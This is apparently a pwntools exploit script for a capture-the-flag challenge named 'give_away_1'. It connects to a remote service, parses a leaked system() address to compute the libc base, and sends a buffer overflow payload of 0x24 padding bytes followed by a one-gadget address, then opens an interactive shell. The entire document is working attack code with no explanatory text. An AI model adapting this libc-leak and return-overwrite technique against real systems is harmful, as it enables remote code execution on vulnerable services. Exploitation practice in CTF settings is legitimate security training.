from pwn import *
r=remote("sharkyctf.xyz",20334)
#r=process("./give_away_1")
libc=ELF("./libc-2.27.so")
oneshot=0x3d0e0
context.log_level='debug'
r.recvuntil(": ")
system_off=int(r.recvline().strip(),16)
libc_base=system_off-libc.symbols['system']

oneshot+=libc_base

pay=""
pay+='x'*0x24
pay+=p32(oneshot)

r.sendline(pay)
r.interactive()
